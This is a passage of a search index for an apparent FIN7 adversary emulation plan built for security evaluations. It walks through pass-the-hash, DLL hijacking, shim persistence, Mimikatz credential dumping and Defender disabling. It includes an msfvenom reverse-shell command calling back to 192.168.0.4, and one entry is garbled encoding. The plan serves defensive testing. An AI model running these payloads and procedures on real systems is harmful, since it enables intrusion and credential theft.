Intelligence","p":["FIN7 has used memory scrapers such as mimikatz to dump the passwords of logged on users. 9, 6","The Carbanak malware has contained a UAC bypass. 10"]},{"i":"test-3---lateral-movement-via-pass-the-hash-evaluations-test-13","l":"Test 3 - Lateral Movement via Pass-the-Hash (Evaluations Test 13)","p":["Step 3 begins with FIN7 downloading paexec.exe and hollow.exe via powershell.exe ( T1105) to domain_admin's AppData\\Local\\ directory on hotelmanager. Next, FIN7 uses a previously obtained password hash to perform a pass-the-hash attack ( T1550.002) with paexec.exe( T1021.002) in order to copy hollow.exe onto itadmin from hotelmanager as domain_admin. paexec.exe starts a temporary Windows service ( T1035) during the copying process called PAExec-{PID}-{HOSTNAME}.exe which executes hollow.exe( T1021.002). hollow.exe spawns svchost.exe and unmaps its memory image ( T1055.012) to insert its payload. svchost.exe then exchanges data with 192.168.0.4 over HTTPS ( T1071.001, T1573.002).","This step consists of behaviors found in Step 6 of Scenario 1."]},{"i":"procedures-1","l":"Procedures"},{"i":"3a---service-execution-via-pass-the-hash-t1075-t1077-t1105-t1059-t1095-t1032","l":"3.A - Service Execution via Pass-the-Hash (T1075, T1077, T1105, T1059, T1095, T1032)","p":["Back on the Linux Attack Platform:","cd to the AppData\\Local directory","Close the RDP session to hotelmanager.","domain_admin_password","Execute getpid to verify that the Meterpreter session is functional","Exit Metasploit","Exit Meterpreter session","Exit this tmux window to get back to the Metasploit window","Exit tmux","Interact with the the newly created Meterpreter session","On hotelmanager:","On the Linux Attack Platform:","Open a CMD prompt","Open a new tmux window","Provide domain_admin's password when prompted:","RDP into hotelmanager as domain_admin","Setup a Meterpreter handler for hollow.exe","Start Metasploit","Start tmux if it is not already started","Upload paexec.exe and hollow.exe to hotelmanager","Use paexec.exe to perform pass-the-hash to execute hollow.exe on itadmin","You should receive a new Meterpreter session."]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["FIN7 has used PAExec to execute remote commands and move laterally within an environment. 9, 6","FIN7 has performed process injection to execute malicious payloads from memory. 19, 13"]},{"i":"test-4---dll-hijacking-evaluations-test-14","l":"Test 4 - DLL Hijacking (Evaluations Test 14)","p":["Step 4 focuses on emulating the DLL Hijacking and module execution functionality of BOOSTWRITE. This step starts by creating a BOOSTWRITE Meterpreter handler and staging a temporary Python HTTP server that returns the ASCII character \"B\" as an XOR decryption key. BOOSTWRITE.dll is then uploaded to itadmin as C:\\Windows\\SysWOW64\\srrstr.dll( T1105). The srrstr.dll DLL is masquerading ( T1036.005 as the legitimate srrstrl.dll found in C:\\Windows\\System32. Next, cmd.exe spawns from svchost.exe( T1059.003) to execute SystemPropertiesAdvanced.exe, which in turn loads and executes the malicious srrstr.dll( T1574). After srrstr.dll has been loaded and executed, rundll32.exe is spawned as a child process to communicate with the C2 server over HTTPS on port 8080 ( T1071, T1573) granting a new shell to the adversary.","This step consists of behaviors found in Step 7 of Scenario 1."]},{"i":"procedures-2","l":"Procedures"},{"i":"4a---prepare-boostwrite-handler","l":"4.A - Prepare BOOSTWRITE Handler","p":["On the Linux Attack Platform:","Start tmux if it is not already started","Start Metasploit","Setup a Meterpreter handler on 8080 for the BOOSTWRITE shell","Open a new tmux window","Setup a Python HTTP server to host the XOR key needed by BOOSTWRITE"]},{"i":"4b---dll-search-order-hijacking-t1105-t1574001","l":"4.B - DLL Search-Order Hijacking (T1105, T1574.001)","p":["Back on the Linux Attack Platform:","Close the RDP session to itadmin.","domain_admin_password","Execute getpid to verify that the Meterpreter session is functional","Execute SystemPropertiesAdvanced.exe to perform the DLL Hijack","Exit current tmux window","Exit Metasploit","Exit Meterpreter session","Exit Python HTTP server tmux window","Exit tmux session","If you execute getpid and receive no output, wait 30 seconds and try again.","Interact with the newly created Meterpreter session","On itadmin:","On the Linux Attack Platform:","On your Ubuntu machine:","Open a new tmux window","Open an administrator CMD prompt","Provide domain_admin's password when prompted:","RDP into itadmin","Sometimes it takes 1-2 minutes for the reflective DLL to register to the C2 server.","Stop Python HTTP server","Upload BOOSTWRITE.dll to C:\\Windows\\Syswow64\\ on itadmin","You should receive a new Meterpreter session on the Linux Attack Platform."]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["BOOSTWRITE is a loader that has been launched via abuse of the DLL search order of applications which load legitimate services. This has included matching names of legitimate DLLs to force applications to import BOOSTWRITE DLLs instead of the legitimate DLLs. 2"]},{"i":"test-5---shim-persistence-evaluations-test-15","l":"Test 5 - Shim Persistence (Evaluations Test 15)","p":["Step 5 focuses on emulating persistence techniques. Adversary emulation begins with a valid logon to the accounting workstation as domain_admin( T1078). After establishing an RDP session from itadmin to accounting over TCP port 3389 ( T1021, T1090), FIN7 runs an encoded PowerShell command ( T1059). This PowerShell command downloads dll329.dll and sdbE376.tmp from the Linux Attack Platform( T1105), and then executes sdbinst.exe to install an application shim ( T1546.011) with the downloaded files.","This step consists of behaviors found in Steps 9 and 10 of Scenario 1."]},{"i":"procedures-3","l":"Procedures"},{"i":"5a---setup-shim-persistence-t1546001","l":"5.A - Setup Shim Persistence (T1546.001)","p":["On the Linux Attack Platform:","Start Metasploit","Start a Meterpreter handler on port 53","On accounting:","RDP into accounting","Open an administrative PowerShell session","Execute the following Powershell command, which will install the application shim for persistence"]},{"i":"5b---execute-shim-persistence-t1546001","l":"5.B - Execute Shim Persistence (T1546.001)","p":["Reboot accounting","Wait for accounting to start back up and then RDP in once again","You should receive a new Meterpreter callback on the Linux Attack Platform.","On the Linux Attack Platform:","Interact with the new Meterpreter session","Execute getpid to verify that the Meterpreter session is functional","Exit Meterpreter session","Exit Metasploit","Close the RDP session to accounting."]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["The Carbanak malware is capable of performing network tunneling. 21","FIN7 has utilized terminal services such as Remote Desktop Protocol (RDP) to move laterally within environments. 9","FIN7 has leveraged an application shim database registered using the sdbinst.exe utility to achieve persistence on systems in multiple environments. To install and register the malicious shim database, FIN7 has used custom Base64 encoded PowerShell scripts. 24","FIN7 has utilized application shimming to execute a payload stored within the registry. 24"]}],[{"l":"Scenario 2 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by FIN7. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating FIN7 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Attacker Desktop: tested and executed on Ubuntu 20.04 LTS","Remote Desktop Client","xfreerdp","Linux Attack Platform: tested and executed on Kali Linux 2019.1","C2 Framework","Metasploit Framework","PAExec","Mimikatz","tmux","Windows Attack Platform: Windows 10 SQL Server 2019 Build 17763","ATT&CK RAT","Optional - Windows 10: Windows 10 Client build 18363","Note, this Windows 10 machine was used ONLY in the event debugging needed to occur during an evaluation."]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Windows Attack Platform","192.168.0.6"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of FIN7 malware.","These utilities include credential dumpers, and variants of process injection techniques.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4.","Binaries that are not pre-compiled have compilation instructions included, e.g. for AccountingIQ.exe","If you would like to build the payloads yourself, please make the necessary adjustments to the payload source to match your environment."]},{"l":"Linux Attack Platform Setup","p":["Download the FIN7 ATTACK Evaluations Library to the home directory"]},{"l":"Windows Attack Platform Setup","p":["Disable firewall in CMD","Setup the MSSQL Database using dbsetup.bat"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763.","Accounting Manager Workstation: tested and executed on Windows 10 - Build 18363.","Hotel Manager: tested and executed on Windows 10 - Build 18363.","IT Admin: tested and executed on Windows 10 - Build 18363."]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","Domain Controller","hoteldc","Hotel Manager Workstation","hotelmanager","IT Admin Workstation","itadmin","Accounting Workstation","accounting"]},{"l":"Domain Controller Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"Hotel Manager Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Disable OLE Security to enable execution of initial access payload","The set-OLEsecurity.ps1 PowerShell script in the setup folder can be used to perform this.","Add a static ARP entry for itadmin:","In a CMP prompt, grab the name of the interface that connects hotelmanager to the domain","Use this interface name to set a static ARP entry"]},{"l":"IT Admin Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Set ACLs to allow full control for everyone on the C:\\Windows\\SysWOW64 directory","The set-acl-syswow64.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"Accounting Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Compile AccountingIQ.exe using the instructions found here","Place AccountingIQ.exe in C:\\Users\\Public","Add AccountingIQ.exe to the Registry Run key"]}],[{"l":"Machine-Readable FIN7 Emulation Plan","p":["The universal, technology-agnostic version of the FIN7 emulation plan YAML has been provided as starting point for machine parsing and execution of the FIN7 emulation plan. This folder will store all versions of this yaml file, including those formatted to work with specific execution runners (such as automated agents like CALDERA or other breach simulation frameworks).","As Scenario 2 uses almost the same content as Scenario 1, but packages it into independent objectives, the YAML contains procedures linked only to the steps from Scenario 1. A table has been provided below to link the procedures within the YAML to the specific Scenario 2 steps."]},{"l":"Included Formats","p":["As new files are added, please list them in the below table.","File","Execution Framework","Notes","Fin7.yaml","N/A","Initial Emulation Plan YAML"]},{"l":"Skipped Procedures","p":["1.A","10.B.3","2.A","2.B","3.A","8.A","A number of procedures within the emulation plan are not present within the YAML file. This is because these procedures integrate with external frameworks or involve interaction with a GUI, which cannot be simply expressed in an automatable format.","Discovery","Exfiltrate Credit Card Data","Reason","SQLRat Execution via Scheduled Task","Step Name/Technique","Step/Procedure","The table below lists the steps/procedures that were skipped along with the reason why.","There is currently not a technology-agnostic standard to represent uploads of files back to the C2 server.","This procedure involves sending an upload command to the RAT through the C2 channel.","This procedure involves sending the command enum-system to the RAT through the C2 channel.","This procedure involves sending the command get-mac-serial to the RAT through the C2 channel.","This procedure relies on a Metasploit module.","Upload Powershell Stager","User Execution: Malicious File","User Monitoring","While the initial execution of the VBE payload can be automated, the payload requires the user to click 'OK' on a dialog box in order for the payload to complete successfully."]},{"l":"Procedures to Note","p":["Certain procedures included in the YAML have been modified or have external dependencies that are not captured within the YAML file.","The table below captures these steps/procedures.","Step/Procedure","YAML Name","Note","4.A","Execution of stager.ps1","An external C2 server needs to be configured to handle the callback from the Meterpreter payload.","6.A","Expand Access","7.A","Privilege Escalation","10.A","Execute Application Shim Persistence"]},{"l":"Scenario 2 Procedure Mapping","p":["1","2","3","4","5","5.A.1 5.A.2","6.A","7.A","9.B 10.A","9a76889c-9518-4b3e-9c87-6618156015c6","ab48e12f-def0-40a4-b3d9-ad958f45202a","ab937ef4-7c66-4349-ad3b-658c41fcf4c5 b15d3014-a5d1-4ec6-934b-d7fe44451192","eb99abcb-93e2-4a3e-bf05-a484839dc851 6ec6561b-e535-4fe3-9c20-a52e5982b513","N/A","N/A (All procedures skipped in YAML)","procedure id","procedure_step","Scenario 2 Step","The procedures in the YAML are mapped directly to the steps in Scenario 1. The table below maps the procedures to the steps of Scenario 2."]}],[{"l":"Resources","p":["Please note that binary executable files hosted here have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Documentation for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["Step5","README.md","Step6","Step7","Step8","Step9","Step10","placeholder_substitution"]}],[{"l":"Babymetal","p":["Payload creation instructions","Generate shellcode","Paste shellcode into BabyMetal.cpp","Compile as DLL","Convert to shellcode with sRDI","Convert to base64 and write to file","Execute shellcode","Note: If you don't have g++, install it with Chocolatey:"]}],[{"l":"Step5"},{"l":"Samcats","p":["Samcats is a slightly modified Mimikatz. It will run lsadump::sam by default without requiring user interaction.","uac-samcats.ps1 is PowerShell script that performs a UAC bypass to execute samcats.exe in a high integrity context."]}],[{"l":"mimikatz","p":["mimikatz is a tool I've made to learn C and make somes experiments with Windows security.","It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.","But that's not all! Crypto, Terminal Server, Events, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on http://blog.gentilkiwi.com(in French, yes).","If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases"]},{"l":"Quick usage"},{"l":"sekurlsa"},{"l":"kerberos"},{"l":"crypto"},{"i":"vault--lsadump","l":"vault & lsadump"},{"l":"Build","p":["mimikatz is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:","for mimikatz and mimilib: Visual Studio 2010, 2012 or 2013 for Desktop ( 2013 Express for Desktop is free and supports x86 & x64- http://www.microsoft.com/download/details.aspx?id=44914)","for mimikatz driver, mimilove (and ddk2003 platform) : Windows Driver Kit 7.1 (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800","mimikatz uses SVN for source control, but is now available with GIT too! You can use any tools you want to sync, even incorporated GIT in Visual Studio 2013 =)"]},{"l":"Synchronize","p":["GIT URL is : https://github.com/gentilkiwi/mimikatz.git","SVN URL is : https://github.com/gentilkiwi/mimikatz/trunk","ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip"]},{"l":"Build the solution","p":["After opening the solution, Build/ Build Solution(you can change architecture)","mimikatz is now built and ready to be used! ( Win32/ x64 even ARM64 if you're lucky)","you can have error MSB3073 about _build_.cmd and mimidrv, it's because the driver cannot be build without Windows Driver Kit 7.1(WinDDK), but mimikatz and mimilib are OK."]},{"l":"ddk2003","p":["With this optional MSBuild platform, you can use the WinDDK build tools, and the default msvcrt runtime (smaller binaries, no dependencies)","For this optional platform, Windows Driver Kit 7.1(WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio 2010 are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.","Follow instructions:","http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme","http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader"]},{"l":"Licence","p":["CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/","mimikatz needs coffee to be developed:","PayPal: https://www.paypal.me/delpy/"]},{"l":"Author","p":["Benjamin DELPY gentilkiwi, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )","DCSync and DCShadow functions in lsadump module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com)","This is a personal development, please respect its philosophy and don't use it for bad things!"]}],[{"l":"Step7"},{"i":"what-does-it-do","l":"What does it do?","p":["BOOSTWRITE.dll is used in a DLL Hijacking technique to give the red team an elevated shell.","Attack Technique T1038"]},{"i":"why-are-we-doing-it","l":"Why are we doing it?","p":["BOOSTWRITE is a utility made by FIN7 that leverages a DLL Hijack routine within a propriteary piece of software (Aloha Command Center). BOOSTWRITE execution models techniques not representing in other aspects of this rounds emulation. These techniques includes code signing and execution guardrails."]},{"i":"how-does-it-work","l":"How does it work?","p":["A HTTP GET request is made to the C2 server.","After our DLL is loaded, it first performs a API call ReadProcessMemory to locate a string of bytes representing a multi-byte XOR encrypted C2 server IP address to reach out to for a XOR key.","After successful decryption of the sRDI payload, memory is virtually allocated, the payload buffer is written to memory and a void pointer to this buffer is executed.","After successfully receiving the single byte key, an embedded sRDI payload is decrypted.","At the end of this execution, the red team should receive a high integrity meterpreter shell.","boostwrite-flow","BOOSTWRITE.dll is renamed to srrstr.dll and uploaded to C:\\Windows\\Syswow64 by a pre-existing meterpreter shell on the target machine.","During execution data is logged to a file within TEMP per-CTI.","For ATT&CK Evals, The utility vulnerable to DLL hijacking used is SystemPropertiesAdvanced.exe (located in C:\\Windows\\syswow64). The execution flow is as follows:","Our functionality resides within DLLMain, meaing upon the DLL being loaded our functionality begins executing.","sRDI is an external framework that takes a DLL and makes it position independent for reflective DLL injection.","SystemPropertiesAdvanced.exe is then launched which does not prompt for UAC confirmation, but does run as a high integrity process.","SystemPropertiesAdvanced.exe loads srrstr.dll from the Syswow64 directory.","The 32 bytes are then XOR'd accordingly and the IP of 192.168.0.4 is revealed.","The embedded payload is a MSFVenom generated DLL payload has been created to be position independt via the sRDI framework.","The response is an ascii \"B\" which in hex is 0x42. This is the single byte xor key used for embedded payload decryption.","This directory is typically write protected, but has been misconfigured on the target machine.","This string of bytes has four \"magic bytes\" of CAFE preceeding it that we're matching on. After CAFE is identified the next 32 bytes represent an XOR encrypted IP address."]}],[{"l":"BOOSTWRITE src"},{"i":"boostwrite---getting-dependencies","l":"Boostwrite - Getting Dependencies","p":["Note, you must have libcurl and zlib locally as a dependency to compile boostwrite.","Recommend using vcpkg, steps listed below.","Get latest vcpkg zip file from https://github.com/microsoft/vcpkg/releases(package available here and extract it to a folder of your choice (e.g. C:\\vcpkg)","Open Developer Command Prompt for VS 2017 (see Windows Start menu or %PROGRAMDATA%\\Microsoft\\Windows\\StartMenu\\Programs\\Visual Studio 2017\\Visual Studio Tools) and cd to C:\\vcpkg\\","Run bootstrap-vcpkg.bat","Run vcpkg.exe integrate install","Run vcpkg.exe install curl"]},{"i":"build-instructions---visual-studio","l":"Build Instructions - Visual Studio","p":["Create new visual studio DLL C++ project.","Substitute template dllmain.cpp for dllmain.cpp in this project.","Add the header files into the project.","Update msfpayload.h with your payload."]},{"l":"MSFPayload Build Cheatsheet for BOOSTWRITE","p":["Generate MSF payload","Leverage SRDI to create PIC code.","Create C array of sRDI DLL or just copy the bytes produced by the previous example","Copy and paste in msfpayload.h","Update variable names as appropriate."]},{"l":"References","p":["Stackoverflow Install Help for libcurl and Visual Studio","sRDI"]}],[{"l":"Curl","p":["ï¿½ï¿½#ï¿½#ï¿½ ï¿½[ï¿½cï¿½uï¿½rï¿½lï¿½]ï¿½(ï¿½hï¿½tï¿½tï¿½pï¿½sï¿½:ï¿½/ï¿½/ï¿½gï¿½iï¿½tï¿½hï¿½uï¿½bï¿½.ï¿½cï¿½oï¿½mï¿½/ï¿½cï¿½uï¿½rï¿½lï¿½/ï¿½cï¿½uï¿½rï¿½lï¿½)ï¿½ï¿½ï¿½*ï¿½ ï¿½Cï¿½oï¿½nï¿½tï¿½eï¿½nï¿½tï¿½sï¿½ ï¿½oï¿½fï¿½ ï¿½tï¿½hï¿½iï¿½sï¿½ ï¿½rï¿½eï¿½pï¿½oï¿½ ï¿½cï¿½aï¿½nï¿½ ï¿½bï¿½eï¿½ ï¿½fï¿½oï¿½uï¿½nï¿½dï¿½ ï¿½[ï¿½hï¿½eï¿½rï¿½eï¿½]ï¿½(ï¿½hï¿½tï¿½tï¿½pï¿½sï¿½:ï¿½/ï¿½/ï¿½gï¿½iï¿½tï¿½hï¿½uï¿½bï¿½.ï¿½cï¿½oï¿½mï¿½/ï¿½cï¿½uï¿½rï¿½lï¿½/ï¿½cï¿½uï¿½rï¿½lï¿½/ï¿½tï¿½rï¿½eï¿½eï¿½/ï¿½mï¿½aï¿½sï¿½tï¿½eï¿½rï¿½/ï¿½iï¿½nï¿½cï¿½lï¿½uï¿½dï¿½eï¿½/ï¿½cï¿½uï¿½rï¿½lï¿½)ï¿½ï¿½ï¿½"]}],[{"l":"LICENSE","p":["COPYRIGHT AND PERMISSION NOTICE","Copyright (c) 1996 - 2021, Daniel Stenberg, daniel@haxx.se, and many contributors, see the THANKS file.","All rights reserved.","Permission to use, copy, modify, and distribute this software for any purpose with or without fee is hereby granted, provided that the above copyright notice and this permission notice appear in all copies.","THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","Except as contained in this notice, the name of a copyright holder shall not be used in advertising or otherwise to promote the sale, use or other dealings in this Software without prior written authorization of the copyright holder."]}],[{"l":"Placeholder Substitution Script","p":["The emulation plans contain placeholders, such as domain, that represent values unique to the target environment that the plans are to be tested against. This script can used to easily substitute those placeholders with the target-specific values."]},{"l":"Substitution Values","p":["substitute_placeholders.py uses the contents of placeholder_values.yml to determine the substitutions to perform within the specified document.","placeholder_values.yml is populated with all of the placeholders present in both of the Carbanak Scenario plans, along with default values for each placeholder. If substitute_placeholders.py is used without making any changes to placeholder_values.yml, the placeholders within the specified script will be replaced with the default values.","To specify a custom value, enter the value within the value field for a placeholder. The script will then use this custom value instead of the default value.","For example:"]},{"l":"Usage"}],[{"i":"screen-recorder-windowspostgatherscreen_spy","l":"Screen Recorder: windows/post/gather/screen_spy","p":["The Metasploit screen_spy module records the user's screen by screenshot'ing the user desktop.","Screenshots are taken using the following Windows API functions:","Screenshots do not appear to be dropped to disk; instead, the screenshots are stored in a buffer in memory, and are sent to the attack platform over the Meterpreter C2 channel.","This module closely emulates the screen-recording implementation seen in Carbanak-malware source code."]},{"l":"References","p":["https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/espia/screen.c","https://github.com/Aekras1a/Updated-Carbanak-Source-with-Plugins/blob/d40434bfa3933b5980babfb1f5552659d73e7b9d/Carbanak%20-%20part%201/botep/WndRec/source/video.cpp","https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getdc"]},{"l":"Meterpreter Keylogger","p":["This step is intended to emulate FIN7's use of the RDFSNIFFER malware.","We inject the Meterpreter keylogger into process memory of mstsc.exe, which is the RDP client.","https://github.com/rapid7/metasploit-payloads/blob/18ed237c1d9ae70030d1b01e64eb67b2c75fa9db/c/meterpreter/source/extensions/stdapi/server/ui/keyboard.c"]}],[{"l":"Step6"},{"i":"hollow-build-instructions---visual-studio","l":"Hollow Build Instructions - Visual Studio","p":["Create new visual studio project.","Add MSFPayload.h and ProcessHollowing.c","Update the payload within MSFPayload.h appropriately"]},{"l":"MSFPayload Build Cheatsheet","p":["Generate MSF payload","Create C array.","Copy and paste msfpayload in MSFPayload.h","Update variable names as appropriate."]}],[{"l":"Step10"},{"l":"AccountingIQ compilation instructions"},{"l":"Install Choco","p":["https://chocolatey.org/install"]},{"l":"Install Mingw","p":["choco install mingw --x86"]},{"l":"Compile","p":["gcc -m32 .\\AccountingIQ.c -o AccountingIQ.exe"]},{"l":"pillowMint compilation instructions"},{"i":"install-choco-1","l":"Install Choco","p":["https://chocolatey.org/install"]},{"i":"install-mingw-1","l":"Install Mingw","p":["[! ] You may need to force install 64bit with --x64 --force if x86 was previously installed","choco install mingw"]},{"i":"compile-1","l":"Compile","p":["g++ -static pillowMint.cpp -o pillowMint.exe"]}],[{"i":"step-19-file-descriptions-role-in-emulation-and-execution-flow","l":"Step 19 File Descriptions, Role in Emulation, and Execution Flow"},{"i":"bin329tmp","l":"bin329.tmp","p":["bin329.tmp is a 32bit sRDI converted meterpreter dll.","msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll","git clone https://github.com/monoxgas/sRDI","python3 sRDI/Python/ConvertToShellcode.py payload.dll","mv payload.bin bin329.tmp","From sudo msfconsole","handler -p windows/meterpreter/reverse_https -H 192.168.0.4 -P 53","This payload will be stored in the registry at HKLM\\SOFTWARE\\Microsoft\\DRM\\4 as a binary value by prep_and_install_shim.ps1"]},{"i":"prep_and_install_shimps1","l":"prep_and_install_shim.ps1","p":["Launch from an interactive administrator PowerShell, prep_and_install_shim.ps1 stores bin329.tmp into the registry, copies over files to C:\\Windows\\Temp, and installs the applicatin shim via sdbinst.exe."]},{"i":"dll329dll","l":"dll329.dll","p":["dll329.dll is a custom statically compiled dll that is injected into the AccountingIQ.exe application via the InjectDLL application shim when the application is launched. Its purpose is to spawn a donor process(SyncHost.exe), inject into it, read the payload registry key, and execute the payload.","Code for this dll can be found in injectDLL-Shim","Simply click the .sln file to open with Visual Studio Code 2019. Then compile."]},{"i":"sdbe376tmp","l":"sdbE376.tmp","p":["sdbE376.tmp is the application shim database file. It contains the information on which to process to appy what shim to with which parameters. For this technique we are targeting AccountingIQ.exe with an InjectDLL shim with a parameter of C:\\Windows\\Temp\\dll329.tmp."]},{"l":"Generating an sdb file from scratch","p":[".\\Compatadmin.exe /x","/x is an undocumented argument that will enable more shims","AccountingIQ for name of program","Browse to program you would like to shim (AccountingIQ.exe)","cd C:\\Program Files (x86)\\Windows Kits\\10\\Assessment and Deployment Kit\\Application Compatibility Toolkit\\Compatibility Administrator (32-bit)","Click Fix to begin","Click Next to skip the Compatability Mode section","Click Parameters","Download the Windows Assessment and Deployment Kit for Windows 10. You only need to select the Application Compatibility Toolkit during installation.","Finish","From an Administrator PowerShell/CMD shell","Microsoft for name of vendor","mv C:\\Windows\\Temp\\sdbE376.sdb C:\\Windows\\Temp\\sdbE376.tmp","Next","OK","Open PowerShell","Save Database as Microsoft KB2832077- Following CTI","Save the SDB file to C:\\Windows\\Temp\\sdbE376.sdb- sdbE376.tmp","sdbinst.exe C:\\Windows\\Temp\\sdbE376.tmp","Select the InjectDLL shim by checking the box to its left","The shim is now installed","Under Command line put the path to the DLL to inject - C:\\Windows\\Temp\\dll329.dll","Unselect all check boxes so that the shim will fire on any application that shares the name AccountingIQ.exe"]},{"l":"Execution Flow","p":["Encoded PowerShell","Drops sdbE376.tmp and dll329.dll to C:\\Windows\\Temp","Sets Reg key with binary data of meterpreter payload to HKLM:\\Software\\Microsoft\\DRM\\4","Invokes sdbinst.exe on sdbE376.tmp- Installs shim","Box is rebooted","Login over RDP onto system","Shim fires on launch of AccountingIQ.exe at login","dll329.dll is injected into AccountingIQ.exe via InjectDLL shim","dll329.dll spawns C:\\Windows\\SysWOW64\\SyncHost.exe as a donor process","dll329.dll injects and maps a function into SyncHost.exe","Function runing in SyncHost.exe now reads payload from HKLM:\\Software\\Microsoft\\DRM\\4 and executes it","User level meterpreter session is spawned"]},{"l":"Process Tree of Execution"},{"l":"Uninstallation","p":["Removing the shim can be done in two ways:","sdbinst.exe -u sdbE376.tmp","Open Control Panel\\Programs\\Programs and Features and look for the Microsoft KB2832077 database name and uninstall it."]}],[{"l":"Change Log"},{"l":"FIN7 Emulation Plan","p":["Version","Date","Change Details","0.1","ATT&CK Evaluations Release","1.0","ATTACK Evaluations Library Release"]}],[{"l":"Emulation Plan Signatures","p":["This section contains YARA rules that can be used to identify files used during the FIN7 ATT&CK Evaluation scenario.","These rules are provided freely to the community without warranty.","The entire risk as to the quality and performance of these rules is with the users."]}],[{"l":"File Hashes","p":["This section contains files hashes that can be used to verify integrity of files used in this adversary emulation plan.","It is recommended that users hash executables and scripts prior to execution to confirm that illicit changes have not been made.","SHA256","SHA512"]}],[{"l":"FIN7 Intelligence Summary"},{"i":"attck-group-id-goo46","l":"ATT&CK Group ID: GOO46","p":["Objectives: FIN7 is a financially-motivated threat group that has been associated with malicious operations dating back to late 2015. 25 The group is characterized by their persistent targeting and large-scale theft of payment card data from victim systems, often using social engineering and spearphishing (T1566) with well-disguised lures to distribute their malware. 9, 11, 12, 26 Beyond the monetization of victim payment card data, FIN7 has used other diverse monetization tactics, including targeting finance departments within victim organizations and targeting individuals with access to material non-public information that the actors could use to gain a competitve advantage in stock trading. 11, 26","Target Industries: FIN7 operations have been directed against victims within the following sectors in the United States and Europe: restaurants, hospitality, casinos and gaming, energy, finance, high-tech, software, travel, education, construction, retail, telecommunications, government, and business services. 11","Operations: Regarding their operational tradecraft, FIN7 is distinguished by their techincal innovation, using novel techniques and displaying characteristics of a well-rounded operation. FIN7 has been reported to employ limited use of exploits while blending publicly available and unique or altered tools. 9 The group has leveraged hidden shortcut files (LNK files) (T1204.002) to initiate infection and VBScript functionality launched by mshta.exe (T1218.005) to infect the victim. 25 This is a departure from previously established usage of weaponized Office macros (T1059.005) and highlights the group's ability to adapt to evade detction. 11","FIN7 has been reported to use the Carbanak backdoor as a post-exploitation tool since as early as 2015. 11 The group has also used creative persistence mechanisms, such as application shimming (T1546.011), to spawn a Carbanak backdoor and seprately to install a payment card harvesting utility. 11, 24 It has also been reported that the group has developed defense evasion techniques rapidly, such as we creating novel obfuscation methods that in some cases were modified on a daily basis while launching attacks targeting multiple victims. 11 FireEye dubbed their development of a payload obfuscation style using the Windows command interpreter's native string substitution as \"FINcoding.\" 11","FIN7 has also used point-of-sale malware, such as Pillowmint, to scrape track 1 and track 2 payment card data from memory. 8"]},{"l":"FIN7 Software","p":["Anunak","Associated 